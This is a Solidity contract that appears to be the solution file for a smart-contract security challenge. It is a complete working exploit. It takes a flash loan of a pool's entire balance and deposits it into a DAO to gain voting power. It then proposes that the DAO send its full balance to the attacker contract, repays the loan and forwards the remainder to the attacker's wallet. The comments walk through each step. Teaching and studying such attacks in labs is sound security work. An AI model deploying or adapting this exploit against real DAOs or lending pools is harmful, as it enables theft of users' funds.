//SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

//Import required interfaces
import "../Challenge-3/DAO.sol";
import "../Challenge-3/flashLoan.sol";

//If you want to test this contract you can do so by changing the contract name to Attack3
//If you have a contract with the name Attack3 already make sure to comment your attack contract out
//You cnan mass comment out a section by highlighting multiple lines & pressing ctrl + / 
contract Attack3Solved {

    //Declare an instance of the flashloan pool interface
    IFlash pool;

    //Declare an instance of the dao interface
    IDao dao;

    //The address of the attacker who deployed this contract
    address attacker;

    //The amount that was borrowed from the pool
    uint256 amountBorrowed;

    constructor(
        IDao _dao,
        IFlash _pool
    ){
        dao = _dao;
        pool = _pool;
        attacker = msg.sender;
    }

    //The function called by the test script
    function attack() external {

        //Start the flashloan
        pool.flashLoan(address(pool).balance);
    }

    //The function called by the flashloan pool
    function receiveLoan() external payable {

        //Get the initial balance of this contract
        uint256 bal = address(this).balance;

        //Store the amount borrowed
        amountBorrowed = bal;

        //Deposit the ETH balance into the dao
        dao.deposit{value: bal}();

        //Build the data being sent
        //This is essentially saying that we want the dao to call this function drainFunds()
        bytes memory data = abi.encodeWithSignature("drainFunds()");

        //Propose the vote saying that we want the DAO to target this address calling drainFunds() & sending it's full balance 
        dao.propose(address(this), data, address(dao).balance);

        //Send the borrowed funds back to the flashloan pool
        //This function is called after the Propose & drainFunds function are completed 
        pool.deposit{value: address(this).balance}();

    }

    function drainFunds() external payable {
        //Transfer the balance minus the amount borrowed to the attackers wallet
        (bool success, ) = attacker.call{value: address(this).balance - amountBorrowed}("");

        //Check that the transfew went through successfully
        require(success,"ERR:OT");//OT => On Transfer
    }

    //This is here so that our contract can receive ETH
    receive() external payable {}
}